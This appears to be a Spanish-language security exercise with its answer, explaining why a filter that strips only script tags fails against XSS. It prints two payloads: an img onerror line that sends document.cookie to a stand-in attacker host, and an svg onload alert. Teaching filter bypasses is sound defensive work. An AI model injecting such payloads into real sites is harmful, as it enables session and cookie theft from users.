## Objetivo 1: El Arte de la Evasión de Filtros (WAF Bypass)

Un desarrollador inexperto intenta bloquear ataques XSS creando un filtro que elimina automáticamente las etiquetas `<script>` y `</script>` de los comentarios de los usuarios. Explica técnicamente por qué esta defensa es inútil y proporciona al menos dos (2) payloads diferentes en HTML/JS que lograrían ejecutar código sin utilizar la etiqueta `<script>`.

---

Bloquear únicamente las etiquetas `<script>` y `</script>` es una mitigación muy débil. Esto porque el motor de JavaScript de los navegadores modernos no se ejecuta exclusivamente a través de la etiqueta de script. Los navegadores permiten ejecutar código mediante **eventos del lado del cliente** (como `onerror`, `onload`, `onmouseover`) asociados a otras etiquetas HTML válidas (`<img>`, `<svg>`, `<body>`, `<iframe>`). Si el filtro solo elimina la palabra "script", el atacante simplemente usa una etiqueta diferente con un manejador de eventos para ejecutar el mismo payload.

Por ejemplo:

1. **Uso de la etiqueta `<img>` con el evento `onerror`**

    ```html
    <img src=x onerror="fetch('https://atacante.com/steal?c='+btoa(document.cookie))">

El navegador intenta cargar la imagen en la ruta x. Como la imagen no existe, se dispara automáticamente el evento onerror, ejecutando el código JavaScript que roba la cookie (codificada en Base64 para evitar problemas de caracteres).

2. **Uso de la etiqueta `<svg>` con el evento `onload`**

    ```html
    <svg onload="alert(document.domain)">

La etiqueta `<svg>` es un estándar para gráficos vectoriales. Al igual que <img>, soporta el evento onload, que se ejecuta en el momento en que el elemento se renderiza en la página. Es un vector muy efectivo cuando los filtros olvidan restringir etiquetas SVG.